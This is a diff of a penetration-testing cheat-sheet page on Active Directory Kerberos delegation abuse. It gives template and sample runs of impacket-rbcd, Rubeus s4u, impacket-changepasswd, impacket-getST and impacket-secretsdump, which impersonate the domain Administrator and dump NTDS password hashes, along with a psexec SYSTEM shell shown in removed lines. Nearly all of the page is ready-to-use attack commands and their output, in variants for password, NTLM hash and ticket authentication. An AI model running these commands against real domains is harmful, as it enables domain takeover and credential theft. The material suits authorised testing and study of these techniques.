+.\rubeus.exe s4u /user:'<COMPUTER>$' /rc4:<HASH> /impersonateuser:administrator /msdsspn:<SPN> /ptt /nowrap
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> .\rubeus.exe s4u /user:'EvilComputer$' /rc4:B9E0CFCEAF6D077970306A2FD88A7C0A /impersonateuser:administrator /msdsspn:cifs/dc.example.com /ptt /nowrap
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> .\rubeus.exe s4u /user:'EvilComputer$' /rc4:B9E0CFCEAF6D077970306A2FD88A7C0A /impersonateuser:administrator /msdsspn:cifs/dc.example.com /ptt /nowrap
 
    ______        _
   (_____ \      | |
@@ -372,7 +635,7 @@ AuditFlags         : None
 #### 7. Convert to ccache Format
 
 ```console
-python3 rubeustoccache.py '<BASE64_TICKET>' secrets.kirbi secrets.ccache
+python3 rubeustoccache.py '<BASE64_TICKET>' <TARGET_USER>.kirbi <TARGET_USER>.ccache
 ```
 
 ```console {class="sample-code"}
@@ -389,44 +652,22 @@ $ python3 rubeustoccache.py 'doIGujCCBr ---[SNIP]--- VyLmh0Yg==' secrets.kirbi s
 [*] All done! Don't forget to set your environment variable: export KRB5CCNAME=secrets.ccache
 ```
 
+<small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>
+
+#### 8. Secrets Dump
+
 ```console
-export KRB5CCNAME=secrets.ccache
+# Pass-the-ticket
+export KRB5CCNAME=<TARGET_USER>.ccache
 ```
 
 ```console {class="sample-code"}
 $ export KRB5CCNAME=secrets.ccache
 ```
 
-<small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>
-
-#### 8. Post-Attack
-
 ```console
-# Remote
-sudo ntpdate -s <DC_IP> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
-```
-
-```console {class="sample-code"}
-$ sudo ntpdate -s dc.example.com && impacket-psexec example.com/administrator@dc.example.com -k -no-pass
-
-Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
-
-[*] Requesting shares on dc.example.com.....
-[*] Found writable share ADMIN$
-[*] Uploading file sxEWFPos.exe
-[*] Opening SVCManager on dc.example.com.....
-[*] Creating service OtwL on dc.example.com.....
-[*] Starting service OtwL.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.17763.5830]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\WINDOWS\system32> 
-```
-
-```console
-# Or secretsdump
-impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
+# Ticket-based Kerberos
+impacket-secretsdump <TARGET_USER>@<TARGET> -k -no-pass
 ```
 
 ```console {class="sample-code"}
@@ -451,103 +692,291 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca
 
 #### 1. RBCD
 
-```console
-impacket-rbcd -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>' -dc-ip <DC_IP> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
+```console {class="password"}
+# Password
+impacket-rbcd '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
 ```
 
 ```console {class="sample-code"}
-$ impacket-rbcd -delegate-from 'aseed' -delegate-to 'DC$' -dc-ip 10.10.86.220 -action 'write' 'example.com/aseed:gB6XTcqVP5MlP7Rc'
+$ impacket-rbcd 'example.com/apple.seed:Password123!' -dc-ip 10.10.11.10 -delegate-from 'apple.seed' -delegate-to 'DC$' -action 'write'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
 [*] Delegation rights modified successfully!
-[*] aseed can now impersonate users on DC$ via S4U2Proxy
+[*] apple.seed can now impersonate users on DC$ via S4U2Proxy
 [*] Accounts allowed to act on behalf of other identity:
-[*]     aseed        (S-1-5-21-4029599044-1972224926-2225194048-1126)
+[*]     apple.seed        (S-1-5-21-4029599044-1972224926-2225194048-1126)
 ```
 
-#### 2. Generate NTLM
+```console {class="ntlm"}
+# NTLM
+impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
+```
+
+```console {class="sample-code"}
+$ impacket-rbcd 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -delegate-from 'apple.seed' -delegate-to 'DC$' -action 'write'
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] apple.seed can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     apple.seed   (S-1-5-21-3542429192-2036945976-3483670807-11601)
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+impacket-rbcd '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
+```
+
+```console {class="sample-code"}
+$ impacket-rbcd 'example.com/apple.seed:Password123!' -k -dc-ip 10.10.11.10 -delegate-from 'apple.seed' -delegate-to 'DC$' -action 'write'
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] apple.seed can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     apple.seed   (S-1-5-21-3542429192-2036945976-3483670807-11601)
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
+```
+
+```console {class="sample-code"}
+$ impacket-rbcd 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -delegate-from 'apple.seed' -delegate-to 'DC$' -action 'write'
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] apple.seed can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     apple.seed   (S-1-5-21-3542429192-2036945976-3483670807-11601)
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+impacket-rbcd '<DOMAIN>/<USER>' -k -dc-ip <DC_IP> -delegate-from '<USER>' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
+```
+
+```console {class="sample-code"}
+$ impacket-rbcd 'example.com/apple.seed' -k -dc-ip 10.10.11.10 -delegate-from 'apple.seed' -delegate-to 'DC$' -action 'write'
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] apple.seed can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     apple.seed   (S-1-5-21-3542429192-2036945976-3483670807-11601)
+```
+
+#### 2. Generate NTLM Hash
 
 ```console
 iconv -f ASCII -t UTF-16LE <(printf '<PASSWORD>') | openssl dgst -md4
 ```
 
 ```console {class="sample-code"}
-$ iconv -f ASCII -t UTF-16LE <(printf 'gB6XTcqVP5MlP7Rc') | openssl dgst -md4
-MD4(stdin)= 8ecffccc2f22c1607b8e104296ffbf68
+$ iconv -f ASCII -t UTF-16LE <(printf 'Password123!') | openssl dgst -md4
+MD4(stdin)= 2B576ACBE6BCFDA7294D6BD18041B8FE
 ```
 
-#### 3. Request a TGT
+#### 3. Request a Ticket
 
 ```console
-impacket-getTGT '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -hashes ':<HASH>'
+# NTLM
+impacket-getTGT '<DOMAIN>/<USER>@<TARGET>' -hashes ':<HASH>'
 ```
 
 ```console {class="sample-code"}
-$ impacket-getTGT 'example.com/aseed@DC.example.com' -hashes ':8ecffccc2f22c1607b8e104296ffbf68'
+$ impacket-getTGT 'example.com/apple.seed@DC.example.com' -hashes ':2B576ACBE6BCFDA7294D6BD18041B8FE'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Saving ticket in aseed@DC.example.com.ccache
+[*] Saving ticket in apple.seed@DC.example.com.ccache
 ```
 
 #### 4. Get Session Key
 
 ```console
-# Import ticket
-export KRB5CCNAME='<CCACHE_FILE>'
+# Pass-the-ticket
+export KRB5CCNAME='<CCACHE>'
 ```
 
 ```console {class="sample-code"}
-$ export KRB5CCNAME='aseed@DC.example.com.ccache'
+$ export KRB5CCNAME='apple.seed@DC.example.com.ccache'
 ```
 
 ```console
 # Get tickey session key
-impacket-describeTicket '<CCACHE_FILE>' | grep 'Ticket Session Key' 
+impacket-describeTicket '<CCACHE>' | grep 'Ticket Session Key' 
 ```
 
 ```console {class="sample-code"}
-$ impacket-describeTicket aseed@DC.example.com.ccache | grep 'Ticket Session Key' 
+$ impacket-describeTicket apple.seed@DC.example.com.ccache | grep 'Ticket Session Key' 
 [*] Ticket Session Key            : 49e0cd8abe883d869f5af9ad8556fb29
 ```
 
 #### 5. Update Target User NT Hash
 
-```console
-impacket-changepasswd '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' -newhashes :<SESSION_KEY>
+```console {class="password"}
+# Password
+impacket-changepasswd '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -dc-ip <DC_IP> -newhashes :<SESSION_KEY>
 ```
 
 ```console {class="sample-code"}
-$ impacket-changepasswd -newhashes :49e0cd8abe883d869f5af9ad8556fb29 'example.com/aseed:gB6XTcqVP5MlP7Rc@DC.example.com'
+$ impacket-changepasswd 'example.com/apple.seed:Password123!@dc.example.com' -dc-ip 10.10.11.10 -newhashes :49e0cd8abe883d869f5af9ad8556fb29
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Changing the password of example.com\aseed
-[*] Connecting to DCE/RPC as example.com\aseed
+[*] Changing the password of example.com\apple.seed
+[*] Connecting to DCE/RPC as example.com\apple.seed
+[*] Password was changed successfully.
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
+```
+
+```console {class="ntlm"}
+# NTLM
+impacket-changepasswd '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> -dc-ip <DC_IP> -newhashes :<SESSION_KEY>
+```
+
+```console {class="sample-code"}
+$ impacket-changepasswd 'example.com/apple.seed@dc.example.com' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -newhashes :49e0cd8abe883d869f5af9ad8556fb29
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of example.com\apple.seed
+[*] Connecting to DCE/RPC as example.com\apple.seed
+[*] Password was changed successfully.
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+impacket-changepasswd '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -k -dc-ip <DC_IP> -newhashes :<SESSION_KEY>
+```
+
+```console {class="sample-code"}
+$ impacket-changepasswd 'example.com/apple.seed:Password123!@dc.example.com' -k -dc-ip 10.10.11.10 -newhashes :49e0cd8abe883d869f5af9ad8556fb29
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of example.com\apple.seed
+[*] Connecting to DCE/RPC as example.com\apple.seed
+[*] Password was changed successfully.
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+impacket-changepasswd '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> -k -dc-ip <DC_IP> -newhashes :<SESSION_KEY>
+```
+
+```console {class="sample-code"}
+$ impacket-changepasswd 'example.com/apple.seed@dc.example.com' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -newhashes :49e0cd8abe883d869f5af9ad8556fb29
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of example.com\apple.seed
+[*] Connecting to DCE/RPC as example.com\apple.seed
+[*] Password was changed successfully.
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+impacket-changepasswd '<DOMAIN>/<USER>@<TARGET>' -k -dc-ip <DC_IP> -newhashes :<SESSION_KEY>
+```
+
+```console {class="sample-code"}
+$ impacket-changepasswd 'example.com/apple.seed@dc.example.com' -k -dc-ip 10.10.11.10 -newhashes :49e0cd8abe883d869f5af9ad8556fb29
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of example.com\apple.seed
+[*] Connecting to DCE/RPC as example.com\apple.seed
 [*] Password was changed successfully.
 [!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
 ```
 
 #### 6. Get a Service Ticket
 
-```console
-impacket-getST '<DOMAIN>/<USER>' -k -no-pass -u2u -impersonate 'Administrator' -spn 'cifs/<TARGET_DOMAIN>'
+```console {class="password"}
+# Password
+sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER> -u2u
 ```
 
 ```console {class="sample-code"}
-$ impacket-getST 'example.com/aseed' -k -no-pass -u2u -impersonate 'Administrator' -spn 'cifs/DC.example.com'
+$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/apple.seed:Password123!' -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator -u2u
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Impersonating Administrator
 [*] Requesting S4U2self+U2U
 [*] Requesting S4U2Proxy
-[*] Saving ticket in Administrator@cifs_DC.example.com@PHANTOM.VL.ccache
+[*] Saving ticket in Administrator@cifs_DC.example.com@example.com.ccache
+```
+
+```console {class="ntlm"}
+# NTLM
+sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER> -u2u
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator -u2u
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_DC.example.com@example.com.ccache
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER> -u2u
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/apple.seed:Password123!' -k -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator -u2u
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_DC.example.com@example.com.ccache
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER> -u2u
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator -u2u
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_DC.example.com@example.com.ccache
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<USER>' -k -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER> -u2u
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/apple.seed' -k -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator -u2u
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_DC.example.com@example.com.ccache
 ```
 
 #### 7. Secrets Dump
 
 ```console
-# Import ticket
-export KRB5CCNAME='<CCACHE_FILE_2>'
+# Pass-the-ticket
+export KRB5CCNAME='<CCACHE_2>'
 ```
 
 ```console {class="sample-code"}
@@ -555,8 +984,19 @@ $ export KRB5CCNAME='Administrator@cifs_DC.example.com@PHANTOM.VL.ccache'
 ```
 
 ```console
-# Secrets dump
-impacket-secretsdump -k -no-pass <TARGET_DOMAIN>
+# Ticket-based Kerberos
+impacket-secretsdump <TARGET_USER>@<TARGET> -k -no-pass
+```
+
+```console {class="sample-code"}
+$ impacket-secretsdump administrator@dc.example.com -k -no-pass -just-dc-user Administrator
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
+---[SNIP]---
+[*] Cleaning up...
 ```
 
 {{< /tabcontent >}}
